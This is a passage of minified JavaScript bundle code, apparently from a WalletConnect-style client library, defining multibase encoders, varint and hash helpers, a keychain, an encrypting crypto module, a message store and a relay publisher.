            base32: Zb,
            base32upper: Yb,
            base32pad: Jb,
            base32padupper: Xb,
            base32hex: Qb,
            base32hexupper: ev,
            base32hexpad: tv,
            base32hexpadupper: rv,
            base32z: nv
        });
        const iv = Nb({
            prefix: "k",
            name: "base36",
            alphabet: "0123456789abcdefghijklmnopqrstuvwxyz"
        })
          , sv = Nb({
            prefix: "K",
            name: "base36upper",
            alphabet: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        });
        var av = Object.freeze({
            __proto__: null,
            base36: iv,
            base36upper: sv
        });
        const cv = Nb({
            name: "base58btc",
            prefix: "z",
            alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        })
          , lv = Nb({
            name: "base58flickr",
            prefix: "Z",
            alphabet: "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"
        });
        var uv = Object.freeze({
            __proto__: null,
            base58btc: cv,
            base58flickr: lv
        });
        const dv = Fb({
            prefix: "m",
            name: "base64",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            bitsPerChar: 6
        })
          , hv = Fb({
            prefix: "M",
            name: "base64pad",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            bitsPerChar: 6
        })
          , fv = Fb({
            prefix: "u",
            name: "base64url",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
            bitsPerChar: 6
        })
          , pv = Fb({
            prefix: "U",
            name: "base64urlpad",
            alphabet: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",
            bitsPerChar: 6
        });
        var gv = Object.freeze({
            __proto__: null,
            base64: dv,
            base64pad: hv,
            base64url: fv,
            base64urlpad: pv
        });
        const yv = Array.from("\ud83d\ude80\ud83e\ude90\u2604\ud83d\udef0\ud83c\udf0c\ud83c\udf11\ud83c\udf12\ud83c\udf13\ud83c\udf14\ud83c\udf15\ud83c\udf16\ud83c\udf17\ud83c\udf18\ud83c\udf0d\ud83c\udf0f\ud83c\udf0e\ud83d\udc09\u2600\ud83d\udcbb\ud83d\udda5\ud83d\udcbe\ud83d\udcbf\ud83d\ude02\u2764\ud83d\ude0d\ud83e\udd23\ud83d\ude0a\ud83d\ude4f\ud83d\udc95\ud83d\ude2d\ud83d\ude18\ud83d\udc4d\ud83d\ude05\ud83d\udc4f\ud83d\ude01\ud83d\udd25\ud83e\udd70\ud83d\udc94\ud83d\udc96\ud83d\udc99\ud83d\ude22\ud83e\udd14\ud83d\ude06\ud83d\ude44\ud83d\udcaa\ud83d\ude09\u263a\ud83d\udc4c\ud83e\udd17\ud83d\udc9c\ud83d\ude14\ud83d\ude0e\ud83d\ude07\ud83c\udf39\ud83e\udd26\ud83c\udf89\ud83d\udc9e\u270c\u2728\ud83e\udd37\ud83d\ude31\ud83d\ude0c\ud83c\udf38\ud83d\ude4c\ud83d\ude0b\ud83d\udc97\ud83d\udc9a\ud83d\ude0f\ud83d\udc9b\ud83d\ude42\ud83d\udc93\ud83e\udd29\ud83d\ude04\ud83d\ude00\ud83d\udda4\ud83d\ude03\ud83d\udcaf\ud83d\ude48\ud83d\udc47\ud83c\udfb6\ud83d\ude12\ud83e\udd2d\u2763\ud83d\ude1c\ud83d\udc8b\ud83d\udc40\ud83d\ude2a\ud83d\ude11\ud83d\udca5\ud83d\ude4b\ud83d\ude1e\ud83d\ude29\ud83d\ude21\ud83e\udd2a\ud83d\udc4a\ud83e\udd73\ud83d\ude25\ud83e\udd24\ud83d\udc49\ud83d\udc83\ud83d\ude33\u270b\ud83d\ude1a\ud83d\ude1d\ud83d\ude34\ud83c\udf1f\ud83d\ude2c\ud83d\ude43\ud83c\udf40\ud83c\udf37\ud83d\ude3b\ud83d\ude13\u2b50\u2705\ud83e\udd7a\ud83c\udf08\ud83d\ude08\ud83e\udd18\ud83d\udca6\u2714\ud83d\ude23\ud83c\udfc3\ud83d\udc90\u2639\ud83c\udf8a\ud83d\udc98\ud83d\ude20\u261d\ud83d\ude15\ud83c\udf3a\ud83c\udf82\ud83c\udf3b\ud83d\ude10\ud83d\udd95\ud83d\udc9d\ud83d\ude4a\ud83d\ude39\ud83d\udde3\ud83d\udcab\ud83d\udc80\ud83d\udc51\ud83c\udfb5\ud83e\udd1e\ud83d\ude1b\ud83d\udd34\ud83d\ude24\ud83c\udf3c\ud83d\ude2b\u26bd\ud83e\udd19\u2615\ud83c\udfc6\ud83e\udd2b\ud83d\udc48\ud83d\ude2e\ud83d\ude46\ud83c\udf7b\ud83c\udf43\ud83d\udc36\ud83d\udc81\ud83d\ude32\ud83c\udf3f\ud83e\udde1\ud83c\udf81\u26a1\ud83c\udf1e\ud83c\udf88\u274c\u270a\ud83d\udc4b\ud83d\ude30\ud83e\udd28\ud83d\ude36\ud83e\udd1d\ud83d\udeb6\ud83d\udcb0\ud83c\udf53\ud83d\udca2\ud83e\udd1f\ud83d\ude41\ud83d\udea8\ud83d\udca8\ud83e\udd2c\u2708\ud83c\udf80\ud83c\udf7a\ud83e\udd13\ud83d\ude19\ud83d\udc9f\ud83c\udf31\ud83d\ude16\ud83d\udc76\ud83e\udd74\u25b6\u27a1\u2753\ud83d\udc8e\ud83d\udcb8\u2b07\ud83d\ude28\ud83c\udf1a\ud83e\udd8b\ud83d\ude37\ud83d\udd7a\u26a0\ud83d\ude45\ud83d\ude1f\ud83d\ude35\ud83d\udc4e\ud83e\udd32\ud83e\udd20\ud83e\udd27\ud83d\udccc\ud83d\udd35\ud83d\udc85\ud83e\uddd0\ud83d\udc3e\ud83c\udf52\ud83d\ude17\ud83e\udd11\ud83c\udf0a\ud83e\udd2f\ud83d\udc37\u260e\ud83d\udca7\ud83d\ude2f\ud83d\udc86\ud83d\udc46\ud83c\udfa4\ud83d\ude47\ud83c\udf51\u2744\ud83c\udf34\ud83d\udca3\ud83d\udc38\ud83d\udc8c\ud83d\udccd\ud83e\udd40\ud83e\udd22\ud83d\udc45\ud83d\udca1\ud83d\udca9\ud83d\udc50\ud83d\udcf8\ud83d\udc7b\ud83e\udd10\ud83e\udd2e\ud83c\udfbc\ud83e\udd75\ud83d\udea9\ud83c\udf4e\ud83c\udf4a\ud83d\udc7c\ud83d\udc8d\ud83d\udce3\ud83e\udd42")
          , mv = yv.reduce(( (e, t, r) => (e[r] = t,
        e)), [])
          , bv = yv.reduce(( (e, t, r) => (e[t.codePointAt(0)] = r,
        e)), []);
        const vv = Mb({
            prefix: "\ud83d\ude80",
            name: "base256emoji",
            encode: function(e) {
                return e.reduce(( (e, t) => e += mv[t]), "")
            },
            decode: function(e) {
                const t = [];
                for (const r of e) {
                    const e = bv[r.codePointAt(0)];
                    if (void 0 === e)
                        throw new Error("Non-base256emoji character: ".concat(r));
                    t.push(e)
                }
                return new Uint8Array(t)
            }
        });
        var wv = Object.freeze({
            __proto__: null,
            base256emoji: vv
        })
          , Tv = function e(t, r, n) {
            r = r || [];
            for (var o = n = n || 0; t >= Pv; )
                r[n++] = 255 & t | Av,
                t /= 128;
            for (; t & Ev; )
                r[n++] = 255 & t | Av,
                t >>>= 7;
            return r[n] = 0 | t,
            e.bytes = n - o + 1,
            r
        }
          , Av = 128
          , Ev = -128
          , Pv = Math.pow(2, 31);
        var Cv = function e(t, r) {
            var n, o = 0, i = (r = r || 0,
            0), s = r, a = t.length;
            do {
                if (s >= a)
                    throw e.bytes = 0,
                    new RangeError("Could not decode varint");
                n = t[s++],
                o += i < 28 ? (n & Iv) << i : (n & Iv) * Math.pow(2, i),
                i += 7
            } while (n >= Sv);
            return e.bytes = s - r,
            o
        }
          , Sv = 128
          , Iv = 127;
        var Bv = Math.pow(2, 7)
          , xv = Math.pow(2, 14)
          , Ov = Math.pow(2, 21)
          , _v = Math.pow(2, 28)
          , Wv = Math.pow(2, 35)
          , Rv = Math.pow(2, 42)
          , kv = Math.pow(2, 49)
          , Mv = Math.pow(2, 56)
          , Nv = Math.pow(2, 63)
          , Fv = {
            encode: Tv,
            decode: Cv,
            encodingLength: function(e) {
                return e < Bv ? 1 : e < xv ? 2 : e < Ov ? 3 : e < _v ? 4 : e < Wv ? 5 : e < Rv ? 6 : e < kv ? 7 : e < Mv ? 8 : e < Nv ? 9 : 10
            }
        }
          , Uv = Fv;
        const Dv = function(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
            return Uv.encode(e, t, r),
            t
        }
          , Lv = e => Uv.encodingLength(e)
          , jv = (e, t) => {
            const r = t.byteLength
              , n = Lv(e)
              , o = n + Lv(r)
              , i = new Uint8Array(o + r);
            return Dv(e, i, 0),
            Dv(r, i, n),
            i.set(t, o),
            new zv(e,r,t,i)
        }
        ;
        class zv {
            constructor(e, t, r, n) {
                this.code = e,
                this.size = t,
                this.digest = r,
                this.bytes = n
            }
        }
        const Vv = e => {
            let {name: t, code: r, encode: n} = e;
            return new Hv(t,r,n)
        }
        ;
        class Hv {
            constructor(e, t, r) {
                this.name = e,
                this.code = t,
                this.encode = r
            }
            digest(e) {
                if (e instanceof Uint8Array) {
                    const t = this.encode(e);
                    return t instanceof Uint8Array ? jv(this.code, t) : t.then((e => jv(this.code, e)))
                }
                throw Error("Unknown type, must be binary type")
            }
        }
        const qv = e => async t => new Uint8Array(await crypto.subtle.digest(e, t))
          , Gv = Vv({
            name: "sha2-256",
            code: 18,
            encode: qv("SHA-256")
        })
          , $v = Vv({
            name: "sha2-512",
            code: 19,
            encode: qv("SHA-512")
        });
        var Kv = Object.freeze({
            __proto__: null,
            sha256: Gv,
            sha512: $v
        });
        const Zv = xb
          , Yv = {
            code: 0,
            name: "identity",
            encode: Zv,
            digest: e => jv(0, Zv(e))
        };
        var Jv = Object.freeze({
            __proto__: null,
            identity: Yv
        });
        new TextEncoder,
        new TextDecoder;
        const Xv = (0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)((0,
        k.A)({}, Db), jb), Vb), qb), Kb), ov), av), uv), gv), wv);
        function Qv(e) {
            return null != globalThis.Buffer ? new Uint8Array(e.buffer,e.byteOffset,e.byteLength) : e
        }
        function ew(e, t, r, n) {
            return {
                name: e,
                prefix: t,
                encoder: {
                    name: e,
                    prefix: t,
                    encode: r
                },
                decoder: {
                    decode: n
                }
            }
        }
        (0,
        k.A)((0,
        k.A)({}, Kv), Jv);
        const tw = ew("utf8", "u", (e => "u" + new TextDecoder("utf8").decode(e)), (e => (new TextEncoder).encode(e.substring(1))))
          , rw = ew("ascii", "a", (e => {
            let t = "a";
            for (let r = 0; r < e.length; r++)
                t += String.fromCharCode(e[r]);
            return t
        }
        ), (e => {
            const t = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0;
                return null != globalThis.Buffer && null != globalThis.Buffer.allocUnsafe ? Qv(globalThis.Buffer.allocUnsafe(e)) : new Uint8Array(e)
            }((e = e.substring(1)).length);
            for (let r = 0; r < e.length; r++)
                t[r] = e.charCodeAt(r);
            return t
        }
        ))
          , nw = (0,
        k.A)({
            utf8: tw,
            "utf-8": tw,
            hex: Xv.base16,
            latin1: rw,
            ascii: rw,
            binary: rw
        }, Xv);
        var ow = Object.defineProperty
          , iw = (e, t, r) => ( (e, t, r) => t in e ? ow(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class sw {
            constructor(e, t) {
                this.core = e,
                this.logger = t,
                iw(this, "keychain", new Map),
                iw(this, "name", "keychain"),
                iw(this, "version", "0.3"),
                iw(this, "initialized", !1),
                iw(this, "storagePrefix", $y),
                iw(this, "init", (async () => {
                    if (!this.initialized) {
                        const e = await this.getKeyChain();
                        typeof e < "u" && (this.keychain = e),
                        this.initialized = !0
                    }
                }
                )),
                iw(this, "has", (e => (this.isInitialized(),
                this.keychain.has(e)))),
                iw(this, "set", (async (e, t) => {
                    this.isInitialized(),
                    this.keychain.set(e, t),
                    await this.persist()
                }
                )),
                iw(this, "get", (e => {
                    this.isInitialized();
                    const t = this.keychain.get(e);
                    if (typeof t > "u") {
                        const {message: t} = Ug("NO_MATCHING_KEY", "".concat(this.name, ": ").concat(e));
                        throw new Error(t)
                    }
                    return t
                }
                )),
                iw(this, "del", (async e => {
                    this.isInitialized(),
                    this.keychain.delete(e),
                    await this.persist()
                }
                )),
                this.core = e,
                this.logger = kt(t, this.name)
            }
            get context() {
                return Rt(this.logger)
            }
            get storageKey() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
            }
            async setKeyChain(e) {
                await this.core.storage.setItem(this.storageKey, su(e))
            }
            async getKeyChain() {
                const e = await this.core.storage.getItem(this.storageKey);
                return typeof e < "u" ? au(e) : void 0
            }
            async persist() {
                await this.setKeyChain(this.keychain)
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
        }
        var aw = Object.defineProperty
          , cw = (e, t, r) => ( (e, t, r) => t in e ? aw(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class lw {
            constructor(e, t, r) {
                this.core = e,
                this.logger = t,
                cw(this, "name", "crypto"),
                cw(this, "keychain"),
                cw(this, "randomSessionIdentifier", rg()),
                cw(this, "initialized", !1),
                cw(this, "init", (async () => {
                    this.initialized || (await this.keychain.init(),
                    this.initialized = !0)
                }
                )),
                cw(this, "hasKeys", (e => (this.isInitialized(),
                this.keychain.has(e)))),
                cw(this, "getClientId", (async () => {
                    this.isInitialized();
                    return Ii(Oi(await this.getClientSeed()).publicKey)
                }
                )),
                cw(this, "generateKeyPair", ( () => {
                    this.isInitialized();
                    const e = function() {
                        const e = Rp.utils.randomPrivateKey()
                          , t = Rp.getPublicKey(e);
                        return {
                            privateKey: Ol(e, Xp),
                            publicKey: Ol(t, Xp)
                        }
                    }();
                    return this.setPrivateKey(e.publicKey, e.privateKey)
                }
                )),
                cw(this, "signJWT", (async e => {
                    this.isInitialized();
                    const t = Oi(await this.getClientSeed())
                      , r = this.randomSessionIdentifier
                      , n = Jy;
                    return await _i(r, e, n, t)
                }
                )),
                cw(this, "generateSharedKey", ( (e, t, r) => {
                    this.isInitialized();
                    const n = function(e, t) {
                        const r = Rp.getSharedSecret(xl(e, Xp), xl(t, Xp));
                        return Ol(ff(pf, r, void 0, void 0, 32), Xp)
                    }(this.getPrivateKey(e), t);
                    return this.setSymKey(n, r)
                }
                )),
                cw(this, "setSymKey", (async (e, t) => {
                    this.isInitialized();
                    const r = t || ng(e);
                    return await this.keychain.set(r, e),
                    r
                }
                )),
                cw(this, "deleteKeyPair", (async e => {
                    this.isInitialized(),
                    await this.keychain.del(e)
                }
                )),
                cw(this, "deleteSymKey", (async e => {
                    this.isInitialized(),
                    await this.keychain.del(e)
                }
                )),
                cw(this, "encode", (async (e, t, r) => {
                    this.isInitialized();
                    const n = dg(r)
                      , o = ot(t);
                    if (fg(n))
                        return function(e, t) {
                            const r = ig(2)
                              , n = nd(12)
                              , o = lg({
                                type: r,
                                sealed: xl(e, tg),
                                iv: n
                            });
                            return t === eg ? ag(o) : o
                        }(o, null === r || void 0 === r ? void 0 : r.encoding);
                    if (hg(n)) {
                        const t = n.senderPublicKey
                          , r = n.receiverPublicKey;
                        e = await this.generateSharedKey(t, r)
                    }
                    const i = this.getSymKey(e)
                      , {type: s, senderPublicKey: a} = n;
                    return function(e) {
                        const t = ig(typeof e.type < "u" ? e.type : 0);
                        if (1 === sg(t) && typeof e.senderPublicKey > "u")
                            throw new Error("Missing sender public key for type 1 envelope");
                        const r = typeof e.senderPublicKey < "u" ? xl(e.senderPublicKey, Xp) : void 0
                          , n = typeof e.iv < "u" ? xl(e.iv, Xp) : nd(12)
                          , o = xl(e.symKey, Xp)
                          , i = lg({
                            type: t,
                            sealed: af(o, n).encrypt(xl(e.message, tg)),
                            iv: n,
                            senderPublicKey: r
                        });
                        return e.encoding === eg ? ag(i) : i
                    }({
                        type: s,
                        symKey: i,
                        message: o,
                        senderPublicKey: a,
                        encoding: null === r || void 0 === r ? void 0 : r.encoding
                    })
                }
                )),
                cw(this, "decode", (async (e, t, r) => {
                    this.isInitialized();
                    const n = function(e, t) {
                        const r = ug({
                            encoded: e,
                            encoding: null === t || void 0 === t ? void 0 : t.encoding
                        });
                        return dg({
                            type: sg(r.type),
                            senderPublicKey: typeof r.senderPublicKey < "u" ? Ol(r.senderPublicKey, Xp) : void 0,
                            receiverPublicKey: null === t || void 0 === t ? void 0 : t.receiverPublicKey
                        })
                    }(t, r);
                    if (fg(n)) {
                        const e = function(e, t) {
                            const {sealed: r} = ug({
                                encoded: e,
                                encoding: t
                            });
                            return Ol(r, tg)
                        }(t, null === r || void 0 === r ? void 0 : r.encoding);
                        return nt(e)
                    }
                    if (hg(n)) {
                        const t = n.receiverPublicKey
                          , r = n.senderPublicKey;
                        e = await this.generateSharedKey(t, r)
                    }
                    try {
                        const n = function(e) {
                            const t = xl(e.symKey, Xp)
                              , {sealed: r, iv: n} = ug({
                                encoded: e.encoded,
                                encoding: e.encoding
                            })
                              , o = af(t, n).decrypt(r);
                            if (null === o)
                                throw new Error("Failed to decrypt");
                            return Ol(o, tg)
                        }({
                            symKey: this.getSymKey(e),
                            encoded: t,
                            encoding: null === r || void 0 === r ? void 0 : r.encoding
                        });
                        return nt(n)
                    } catch (ct) {
                        this.logger.error("Failed to decode message from topic: '".concat(e, "', clientId: '").concat(await this.getClientId(), "'")),
                        this.logger.error(ct)
                    }
                }
                )),
                cw(this, "getPayloadType", (function(e) {
                    return sg(ug({
                        encoded: e,
                        encoding: arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Qp
                    }).type)
                }
                )),
                cw(this, "getPayloadSenderPublicKey", (function(e) {
                    const t = ug({
                        encoded: e,
                        encoding: arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Qp
                    });
                    return t.senderPublicKey ? Ol(t.senderPublicKey, Xp) : void 0
                }
                )),
                this.core = e,
                this.logger = kt(t, this.name),
                this.keychain = r || new sw(this.core,this.logger)
            }
            get context() {
                return Rt(this.logger)
            }
            async setPrivateKey(e, t) {
                return await this.keychain.set(e, t),
                e
            }
            getPrivateKey(e) {
                return this.keychain.get(e)
            }
            async getClientSeed() {
                let e = "";
                try {
                    e = this.keychain.get(Yy)
                } catch (t) {
                    e = rg(),
                    await this.keychain.set(Yy, e)
                }
                return function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "utf8";
                    const r = nw[t];
                    if (!r)
                        throw new Error('Unsupported encoding "'.concat(t, '"'));
                    return "utf8" !== t && "utf-8" !== t || null == globalThis.Buffer || null == globalThis.Buffer.from ? r.decoder.decode("".concat(r.prefix).concat(e)) : Qv(globalThis.Buffer.from(e, "utf-8"))
                }(e, "base16")
            }
            getSymKey(e) {
                return this.keychain.get(e)
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
        }
        var uw = Object.defineProperty
          , dw = Object.defineProperties
          , hw = Object.getOwnPropertyDescriptors
          , fw = Object.getOwnPropertySymbols
          , pw = Object.prototype.hasOwnProperty
          , gw = Object.prototype.propertyIsEnumerable
          , yw = (e, t, r) => t in e ? uw(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , mw = (e, t, r) => yw(e, "symbol" != typeof t ? t + "" : t, r);
        class bw extends zt {
            constructor(e, t) {
                super(e, t),
                this.logger = e,
                this.core = t,
                mw(this, "messages", new Map),
                mw(this, "messagesWithoutClientAck", new Map),
                mw(this, "name", "messages"),
                mw(this, "version", "0.3"),
                mw(this, "initialized", !1),
                mw(this, "storagePrefix", $y),
                mw(this, "init", (async () => {
                    if (!this.initialized) {
                        this.logger.trace("Initialized");
                        try {
                            const e = await this.getRelayerMessages();
                            typeof e < "u" && (this.messages = e);
                            const t = await this.getRelayerMessagesWithoutClientAck();
                            typeof t < "u" && (this.messagesWithoutClientAck = t),
                            this.logger.debug("Successfully Restored records for ".concat(this.name)),
                            this.logger.trace({
                                type: "method",
                                method: "restore",
                                size: this.messages.size
                            })
                        } catch (Ot) {
                            this.logger.debug("Failed to Restore records for ".concat(this.name)),
                            this.logger.error(Ot)
                        } finally {
                            this.initialized = !0
                        }
                    }
                }
                )),
                mw(this, "set", (async (e, t, r) => {
                    this.isInitialized();
                    const n = og(t);
                    let o = this.messages.get(e);
                    if (typeof o > "u" && (o = {}),
                    typeof o[n] < "u")
                        return n;
                    if (o[n] = t,
                    this.messages.set(e, o),
                    r === fm) {
                        const r = this.messagesWithoutClientAck.get(e) || {};
                        this.messagesWithoutClientAck.set(e, ( (e, t) => dw(e, hw(t)))(( (e, t) => {
                            for (var r in t || (t = {}))
                                pw.call(t, r) && yw(e, r, t[r]);
                            if (fw)
                                for (var r of fw(t))
                                    gw.call(t, r) && yw(e, r, t[r]);
                            return e
                        }
                        )({}, r), {
                            [n]: t
                        }))
                    }
                    return await this.persist(),
                    n
                }
                )),
                mw(this, "get", (e => {
                    this.isInitialized();
                    let t = this.messages.get(e);
                    return typeof t > "u" && (t = {}),
                    t
                }
                )),
                mw(this, "getWithoutAck", (e => {
                    this.isInitialized();
                    const t = {};
                    for (const r of e) {
                        const e = this.messagesWithoutClientAck.get(r) || {};
                        t[r] = Object.values(e)
                    }
                    return t
                }
                )),
                mw(this, "has", ( (e, t) => {
                    this.isInitialized();
                    return typeof this.get(e)[og(t)] < "u"
                }
                )),
                mw(this, "ack", (async (e, t) => {
                    this.isInitialized();
                    const r = this.messagesWithoutClientAck.get(e);
                    if (typeof r > "u")
                        return;
                    delete r[og(t)],
                    0 === Object.keys(r).length ? this.messagesWithoutClientAck.delete(e) : this.messagesWithoutClientAck.set(e, r),
                    await this.persist()
                }
                )),
                mw(this, "del", (async e => {
                    this.isInitialized(),
                    this.messages.delete(e),
                    this.messagesWithoutClientAck.delete(e),
                    await this.persist()
                }
                )),
                this.logger = kt(e, this.name),
                this.core = t
            }
            get context() {
                return Rt(this.logger)
            }
            get storageKey() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name
            }
            get storageKeyWithoutClientAck() {
                return this.storagePrefix + this.version + this.core.customStoragePrefix + "//" + this.name + "_withoutClientAck"
            }
            async setRelayerMessages(e) {
                await this.core.storage.setItem(this.storageKey, su(e))
            }
            async setRelayerMessagesWithoutClientAck(e) {
                await this.core.storage.setItem(this.storageKeyWithoutClientAck, su(e))
            }
            async getRelayerMessages() {
                const e = await this.core.storage.getItem(this.storageKey);
                return typeof e < "u" ? au(e) : void 0
            }
            async getRelayerMessagesWithoutClientAck() {
                const e = await this.core.storage.getItem(this.storageKeyWithoutClientAck);
                return typeof e < "u" ? au(e) : void 0
            }
            async persist() {
                await this.setRelayerMessages(this.messages),
                await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
        }
        var vw = Object.defineProperty
          , ww = Object.defineProperties
          , Tw = Object.getOwnPropertyDescriptors
          , Aw = Object.getOwnPropertySymbols
          , Ew = Object.prototype.hasOwnProperty
          , Pw = Object.prototype.propertyIsEnumerable
          , Cw = (e, t, r) => t in e ? vw(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , Sw = (e, t) => {
            for (var r in t || (t = {}))
                Ew.call(t, r) && Cw(e, r, t[r]);
            if (Aw)
                for (var r of Aw(t))
                    Pw.call(t, r) && Cw(e, r, t[r]);
            return e
        }
          , Iw = (e, t) => ww(e, Tw(t))
          , Bw = (e, t, r) => Cw(e, "symbol" != typeof t ? t + "" : t, r);
        class xw extends Vt {
            constructor(e, t) {
                super(e, t),
                this.relayer = e,
                this.logger = t,
                Bw(this, "events", new Se.EventEmitter),
                Bw(this, "name", "publisher"),
                Bw(this, "queue", new Map),
                Bw(this, "publishTimeout", (0,
                Be.toMiliseconds)(Be.ONE_MINUTE)),
                Bw(this, "initialPublishTimeout", (0,
                Be.toMiliseconds)(15 * Be.ONE_SECOND)),
                Bw(this, "needsTransportRestart", !1),
                Bw(this, "publish", (async (e, t, r) => {
                    var n;
                    this.logger.debug("Publishing Payload"),
                    this.logger.trace({
                        type: "method",
                        method: "publish",
                        params: {
                            topic: e,
                            message: t,
                            opts: r
                        }
                    });
                    const o = (null === r || void 0 === r ? void 0 : r.ttl) || Xy
                      , i = gg(r)
                      , s = (null === r || void 0 === r ? void 0 : r.prompt) || !1
                      , a = (null === r || void 0 === r ? void 0 : r.tag) || 0
                      , c = (null === r || void 0 === r ? void 0 : r.id) || Sy().toString()
                      , l = {
                        topic: e,
                        message: t,
                        opts: {
                            ttl: o,
                            relay: i,
                            prompt: s,
                            tag: a,
                            id: c,
                            attestation: null === r || void 0 === r ? void 0 : r.attestation,
                            tvf: null === r || void 0 === r ? void 0 : r.tvf
                        }
                    }
                      , u = "Failed to publish payload, please try again. id:".concat(c, " tag:").concat(a);
                    try {
                        const n = new Promise((async n => {
                            const i = e => {
                                let {id: t} = e;
                                l.opts.id === t && (this.removeRequestFromQueue(t),
                                this.relayer.events.removeListener(sm, i),
                                n(l))
                            }
                            ;
                            this.relayer.events.on(sm, i);
                            const u = lu(new Promise(( (n, i) => {
                                this.rpcPublish({
                                    topic: e,
                                    message: t,
                                    ttl: o,
                                    prompt: s,
                                    tag: a,
                                    id: c,
                                    attestation: null === r || void 0 === r ? void 0 : r.attestation,
                                    tvf: null === r || void 0 === r ? void 0 : r.tvf
                                }).then(n).catch((e => {
                                    this.logger.warn(e, null === e || void 0 === e ? void 0 : e.message),
                                    i(e)
                                }
                                ))
                            }
                            )), this.initialPublishTimeout, "Failed initial publish, retrying.... id:".concat(c, " tag:").concat(a));
                            try {
                                await u,
                                this.events.removeListener(sm, i)
                            } catch (d) {
                                this.queue.set(c, Iw(Sw({}, l), {
                                    attempt: 1
                                })),
                                this.logger.warn(d, null === d || void 0 === d ? void 0 : d.message)
                            }
                        }
                        ));
                        this.logger.trace({
                            type: "method",
                            method: "publish",
                            params: {
                                id: c,
                                topic: e,
                                message: t,
                                opts: r
                            }
                        }),
                        await lu(n, this.publishTimeout, u)
                    } catch (d) {
                        if (this.logger.debug("Failed to Publish Payload"),
                        this.logger.error(d),
                        null != (n = null === r || void 0 === r ? void 0 : r.internal) && n.throwOnFailedPublish)
                            throw d
                    } finally {
                        this.queue.delete(c)
                    }
                }
                )),
                Bw(this, "on", ( (e, t) => {
                    this.events.on(e, t)
                }
                )),
                Bw(this, "once", ( (e, t) => {
                    this.events.once(e, t)
                }
                )),
                Bw(this, "off", ( (e, t) => {
                    this.events.off(e, t)
                }
                )),
                Bw(this, "removeListener", ( (e, t) => {
                    this.events.removeListener(e, t)
                }
                )),
                this.relayer = e,
                this.logger = kt(t, this.name),
                this.registerEventListeners()
            }
            get context() {
                return Rt(this.logger)
            }
            async rpcPublish(e) {
                var t, r, n, o;
                const {topic: i, message: s, ttl: a=Xy, prompt: c, tag: l, id: u, attestation: d, tvf: h} = e
                  , f = {
                    method: yg(gg().protocol).publish,
                    params: Sw({
                        topic: i,
                        message: s,
                        ttl: a,
                        prompt: c,
                        tag: l,
                        attestation: d
                    }, h),
                    id: u
                };
                zg(null == (t = f.params) ? void 0 : t.prompt) && (null == (r = f.params) || delete r.prompt),
                zg(null == (n = f.params) ? void 0 : n.tag) && (null == (o = f.params) || delete o.tag),
                this.logger.debug("Outgoing Relay Payload"),
                this.logger.trace({
                    type: "message",
                    direction: "outgoing",
                    request: f
                });
                const p = await this.relayer.request(f);
                return this.relayer.events.emit(sm, e),
                this.logger.debug("Successfully Published Payload"),
                p
            }
            removeRequestFromQueue(e) {
                this.queue.delete(e)
            }
            checkQueue() {
                this.queue.forEach((async (e, t) => {
                    const r = e.attempt + 1;
                    this.queue.set(t, Iw(Sw({}, e), {
                        attempt: r
                    }));
                    const {topic: n, message: o, opts: i, attestation: s} = e;
                    this.logger.warn({}, "Publisher: queue->publishing: ".concat(e.opts.id, ", tag: ").concat(e.opts.tag, ", attempt: ").concat(r)),
                    await this.rpcPublish(Iw(Sw({}, e), {
                        topic: n,
                        message: o,
                        ttl: i.ttl,
                        prompt: i.prompt,
                        tag: i.tag,
                        id: i.id,
                        attestation: s,
                        tvf: i.tvf
                    })),
                    this.logger.warn({}, "Publisher: queue->published: ".concat(e.opts.id))
                }
                ))
            }
            registerEventListeners() {
                this.relayer.core.heartbeat.on(We, ( () => {
                    if (this.needsTransportRestart)
                        return this.needsTransportRestart = !1,
                        void this.relayer.events.emit(im);
                    this.checkQueue()
                }
                )),
                this.relayer.on(tm, (e => {
                    this.removeRequestFromQueue(e.id.toString())
                }
                ))
            }
        }
        var Ow = Object.defineProperty
          , _w = (e, t, r) => ( (e, t, r) => t in e ? Ow(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class Ww {
            constructor() {
                _w(this, "map", new Map),
                _w(this, "set", ( (e, t) => {
                    const r = this.get(e);
                    this.exists(e, t) || this.map.set(e, [...r, t])
                }
                )),
                _w(this, "get", (e => this.map.get(e) || [])),
                _w(this, "exists", ( (e, t) => this.get(e).includes(t))),
